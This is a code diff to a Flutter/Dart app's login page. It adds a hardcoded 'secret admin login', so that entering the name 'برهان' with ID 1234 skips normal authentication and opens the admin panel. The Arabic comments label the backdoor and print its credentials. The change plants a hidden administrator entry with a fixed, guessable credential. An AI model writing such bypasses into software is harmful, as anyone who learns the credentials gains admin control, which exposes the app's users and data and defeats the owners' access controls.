@@ -1601,6 +1601,7 @@ class _MrOtakuAppState extends State<MrOtakuApp> {
 
 /// =======================================================
 /// تسجيل الدخول بالحساب
+/// ⭐ يحتوي على دخول المدير السري
 /// =======================================================
 
 class AccountSetupPage extends StatefulWidget {
@@ -1638,6 +1639,28 @@ class _AccountSetupPageState extends State<AccountSetupPage> {
     });
 
     await playClickSound();
+
+    // ⭐⭐⭐ دخول المدير السري ⭐⭐⭐
+    // الاسم: برهان | المعرف: 1234
+    if (name == 'برهان' && id == 1234) {
+      await widget.data.setAdminSession(true);
+      await widget.data.loadData();
+
+      if (!mounted) return;
+
+      setState(() {
+        loading = false;
+      });
+
+      Navigator.pushReplacement(
+        context,
+        MaterialPageRoute(
+          builder: (_) => AdminPanelPage(data: widget.data),
+        ),
+      );
+      return;
+    }
+    // ⭐⭐⭐ نهاية الدخول السري ⭐⭐⭐
 
     final success = await widget.data.loginAccount(name, id);
 
